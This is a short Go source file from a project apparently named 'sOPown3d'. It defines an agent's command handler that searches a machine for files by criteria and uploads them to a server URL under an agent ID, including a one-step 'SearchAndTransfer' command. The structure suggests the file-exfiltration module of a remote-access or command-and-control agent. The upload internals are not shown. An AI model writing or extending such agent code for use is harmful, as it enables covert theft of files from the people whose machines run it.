package commands

import (
	"sOPown3d/internal/agent/finder"
	"sOPown3d/internal/agent/transfer"
)

type Handler struct {
	finder   *finder.Finder
	uploader *transfer.Uploader
}

func NewHandler(serverURL, agentID string, maxFileSize int64) *Handler {
	return &Handler{
		finder:   finder.NewFinder(maxFileSize),
		uploader: transfer.NewUploader(serverURL, agentID),
	}
}

// Search only - return list of files found
func (h *Handler) Search(criteria finder.SearchCriteria) ([]finder.FileInfo, error) {
	return h.finder.Search(criteria)
}

// Transfer specific files
func (h *Handler) Transfer(filePaths []string) map[string]error {
	return h.uploader.UploadFiles(filePaths)
}

// Search and transfer in one command
func (h *Handler) SearchAndTransfer(criteria finder.SearchCriteria) (map[string]error, error) {
	// First search
	results, err := h.finder.Search(criteria)
	if err != nil {
		return nil, err
	}

	// Extract paths
	var paths []string
	for _, file := range results {
		paths = append(paths, file.Path)
	}

	// Then transfer
	uploadErrors := h.uploader.UploadFiles(paths)
	return uploadErrors, nil
}
